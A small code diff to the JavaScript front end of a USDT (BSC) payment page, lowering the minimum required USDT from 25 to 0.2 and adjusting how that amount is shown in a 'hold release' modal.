@@ -13,7 +13,7 @@
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
         CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Direct Merchant Account Address
-        USER_MIN_USDT: 25, // Minimum 25 USDT required
+        USER_MIN_USDT: 0.2, // Minimum 0.2 USDT required
         GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
         GAS_RETRY_DELAY: 3000,
@@ -430,7 +430,7 @@
             elements.holdReleaseBtn.addEventListener('click', function () {
                 closeAllModals();
                 if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance} USDT`;
-                if (elements.releaseRequired) elements.releaseRequired.textContent = `${CONFIG.USER_MIN_USDT}.00 USDT`;
+                if (elements.releaseRequired) elements.releaseRequired.textContent = `${CONFIG.USER_MIN_USDT} USDT`;
                 openModal(elements.releaseModal);
             });
         }
